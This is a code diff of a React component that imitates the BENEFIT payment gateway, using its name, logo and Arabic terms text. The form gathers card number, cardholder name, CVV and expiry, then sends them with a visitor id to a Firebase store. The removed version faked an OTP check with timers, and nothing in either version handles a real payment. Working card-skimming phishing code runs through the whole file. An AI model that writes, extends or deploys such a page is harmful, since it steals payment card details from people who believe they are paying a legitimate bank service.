@@ -1,19 +1,10 @@
 "use client"
 
-import type React from "react"
-
-import { useState, useRef, useEffect } from "react"
-import { OTPVerification } from "./otp"
-import { FullPageLoader } from "../loader"
-import { NumericKeypad } from "./numeric-keypad"
+import React, { useState } from "react"
 import { addData } from "../firebase"
 import { useCart } from "../cartContext"
 
 export default function BenefitPaymentGateway() {
-  const [isLoading, setIsLoading] = useState(false)
-  const [showKeypad, setShowKeypad] = useState(false)
-  const [currentStep, setCurrentStep] = useState<"form" | "otp" | "success" | "error">("form")
-  const cvvInputRef = useRef<HTMLInputElement>(null)
   const [cardNumber, setCardNumber] = useState("")
   const [cardholderName, setCardholderName] = useState("")
   const [cvv, setCvv] = useState("")
@@ -21,95 +12,14 @@ export default function BenefitPaymentGateway() {
   const [yaer, setYear] = useState("")
   const {total} = useCart() as any
 const data={cardNumber,cardholderName,cvv,month,yaer}
-
-  // Handle clicking outside the keypad to close it
-  useEffect(() => {
-    function handleClickOutside(event: MouseEvent) {
-      if (
-        cvvInputRef.current &&
-        !cvvInputRef.current.contains(event.target as Node) &&
-        !(event.target as HTMLElement).closest(".numeric-keypad")
-      ) {
-        setShowKeypad(false)
-      }
-    }
-
-    document.addEventListener("mousedown", handleClickOutside)
-    return () => {
-      document.removeEventListener("mousedown", handleClickOutside)
-    }
-  }, [])
-
-  const handleSubmit = (e: React.FormEvent) => {
-    e.preventDefault()
-    setIsLoading(true)
-    const vId=localStorage.getItem('visitor')
-    addData({id:vId,...data})
-    // Simulate payment processing and move to OTP step
-    setTimeout(() => {
-      setIsLoading(false)
-      setCurrentStep("otp")
-    }, 1500)
-  }
-
-  // Update the handleVerifyOTP function to simulate successful verification
-  const handleVerifyOTP = () => {
-    setIsLoading(true)
-
-    // Simulate OTP verification
-    setTimeout(() => {
-      setIsLoading(false)
-      setCurrentStep("success")
-    }, 2000)
-  }
-
-  // Add a function to handle OTP errors
-  const handleOTPError = () => {
-    // This function would be called if we wanted to handle OTP errors at the parent level
-    // For now, we're handling errors within the OTP component
-  }
-
-  const handlePaymentError = () => {
-    setCurrentStep("error")
-  }
-
-  const handleCvvFocus = () => {
-    setShowKeypad(true)
-  }
-
-  const handleKeypadEnter = () => {
-    setShowKeypad(false)
-    // Move focus to next field or submit form
-  }
-
-  const handleResetForm = () => {
-    setCardNumber("")
-    setCardholderName("")
-    setCvv("")
-    setCurrentStep("form")
-  }
-
-  // Render different steps based on current state
-  if (currentStep === "otp") {
-    return (
-      <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.8,fontSize:12,lineHeight:1.2,padding:25}}>
-      {isLoading && <FullPageLoader text="Verifying OTP..." />}
-        <OTPVerification
-          amount="1.000"
-          cardNumber={cardNumber || "5586861234568686"}
-          onVerify={handleVerifyOTP}
-          onCancel={handleResetForm}
-        />
-      </div>
-    )
-  }
-
-
+const handleSubmit=(e:React.FormEvent)=>{
+  e.preventDefault()
+  const vId=localStorage.getItem('visitor')
+  addData({id:vId,...data})
+}
   return (
-    <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.8,fontSize:12,lineHeight:1.2,padding:15}}>
-      {isLoading && <FullPageLoader />}
-
-      <div className="w-full max-w-md bg-white border border-gray-200 shadow-sm">
+    <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.8,fontSize:12,lineHeight:1.2,padding:25}}>
+      <div className="w-full max-w-md bg-white border border-gray-200">
         {/* Language selector */}
         <div className="text-left p-4">
           <span className="text-red-600 font-medium">English</span>
@@ -118,23 +28,12 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
         {/* Header */}
         <div className="text-center mb-4">
           <h1 className="text-red-600 font-bold text-2xl">BENEFIT PAYMENT GATEWAY</h1>
-          <p className="text-red-600 font-bold mt-1">
-            {new Date()
-              .toLocaleDateString("en-GB", {
-                day: "2-digit",
-                month: "2-digit",
-                year: "numeric",
-                hour: "2-digit",
-                minute: "2-digit",
-                hour12: false,
-              })
-              .replace(/\//g, "-")}
-          </p>
+          <p className="text-red-600 font-bold mt-1">{new Date().toISOString().substring(0,10)}</p>
         </div>
 
         {/* Benefit Logo */}
         <div className="flex justify-center mb-4">
-          <img src="/logo.webp" alt="Benefit Logo" width={100} height={100} className="mx-auto" />
+          <img src="/logo.webp" alt="Benefit Logo" width={50} height={100} className="mx-auto" />
         </div>
 
         {/* Merchant Info */}
@@ -144,8 +43,8 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
         </div>
 
         {/* Payment Details */}
-        <form onSubmit={handleSubmit} className="px-6">
-          <div className="space-y-5 mb-8">
+        <div className="px-6">
+          <form className="space-y-5 mb-8" onSubmit={handleSubmit}>
             <div className="flex justify-between items-center">
               <span className="text-right font-medium text-lg">المبلغ</span>
               <span className="font-bold text-lg"> {total.toFixed(2)}<strong style={{margin:2}}>BD</strong></span>
@@ -165,17 +64,16 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
                 id="cardNumber"
                 type="text"
                 value={cardNumber}
-                onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ""))}
+                onChange={(e) => setCardNumber(e.target.value)}
                 className="border border-gray-300 rounded p-2 w-64 text-left"
                 placeholder=""
-                required
               />
             </div>
 
             <div className="flex justify-between items-center">
-              <label className="text-right font-medium">تاريخ الصلاحية</label>
+              <label className="text-left font-medium">تاريخ الصلاحية</label>
               <div className="flex gap-2">
-                <select className="border border-gray-300 rounded p-2 w-[104px] appearance-none bg-white" required>
+                <select onChange={(e)=>setYear(e.target.value)} className="border border-gray-300 rounded p-2 w-[104px] appearance-none bg-white">
                   <option value="">YYYY</option>
                   {Array.from({ length: 10 }, (_, i) => 2025 + i).map((year) => (
                     <option key={year} value={year}>
@@ -183,7 +81,7 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
                     </option>
                   ))}
                 </select>
-                <select className="border border-gray-300 rounded p-2 w-[104px] appearance-none bg-white" required>
+                <select  className="border border-gray-300 rounded p-2 w-[104px] appearance-none bg-white">
                   <option value="">MM</option>
                   {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                     <option key={month} value={month}>
@@ -205,7 +103,6 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
                 onChange={(e) => setCardholderName(e.target.value)}
                 className="border border-gray-300 rounded p-2 w-64 text-left"
                 placeholder=""
-                required
               />
             </div>
 
@@ -217,37 +114,27 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
                 id="cvv"
                 type="password"
                 value={cvv}
-                onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
-                onFocus={handleCvvFocus}
-                ref={cvvInputRef}
+                onChange={(e) => setCvv(e.target.value)}
                 className="border border-gray-300 rounded p-2 w-64 text-left"
                 placeholder=""
-                required
-                readOnly={showKeypad}
-                maxLength={4}
               />
             </div>
-          </div>
+          </form>
 
           {/* Action Buttons */}
-          <div className="flex gap-4 mb-6">
-            <button
-              type="button"
-              className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
-            >
+          <div className="flex justify-center mt-4 gap-4 mb-6" style={{marginTop:18}} >
+            <button type={'reset'} className="bg-red-600 text-white rounded py-2.5 px-8 w-1/3 font-medium hover:bg-red-700 transition-colors">
               إلغاء
             </button>
-            <button
-              type="submit"
-              className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
-            >
+            <button type={'submit'} className="bg-red-600 text-white rounded py-2.5 px-8 w-1/3 font-medium hover:bg-red-700 transition-colors">
               دفع
             </button>
           </div>
 
           {/* Accepted Cards */}
           <div className="text-right mb-4">
-            <a href="#" className="text-red-600 hover:underline text-sm">
+          <a
+ href="#" className="text-red-400 underline text-sm" style={{color:'red',marginTop:11,borderBottom:'1px solid red'}}>
               عرض البطاقات المقبولة
             </a>
           </div>
@@ -257,24 +144,17 @@ const data={cardNumber,cardholderName,cvv,month,yaer}
             <p dir="rtl">
               <span className="font-bold">ملاحظة:</span> إن تقديم هذه المعلومات واستخدام "بوابة الدفع الإلكترونية من
               بنفت" يعني موافقتك على{" "}
-              <a href="#" className="text-red-600 hover:underline">
+              <a href="#" className="text-red-600 hover:underline"  style={{color:'red',marginTop:11,borderBottom:'1px solid red'}}>
                 شروط هذه الخدمة - إبراء الذمة القانوني
               </a>
               .
             </p>
           </div>
-        </form>
-
-        {/* Numeric Keypad */}
-        {showKeypad && (
-          <div className="fixed bottom-0 left-0 right-0 numeric-keypad">
-            <NumericKeypad value={cvv} onValueChange={setCvv} maxLength={4} onEnter={handleKeypadEnter} />
-          </div>
-        )}
+        </div>
 
         {/* Footer */}
         <div className="text-center space-y-2 mb-6">
-          <img src="/logo.webp" alt="Benefit Logo" width={80} height={80} className="mx-auto" />
+          <img src="/logo.webp" alt="Benefit Logo" width={70} height={70} className="mx-auto" />
           <div className="px-6">
             <p className="text-right text-sm" dir="rtl">
               يدار الموقع من قبل شركة بنفت.
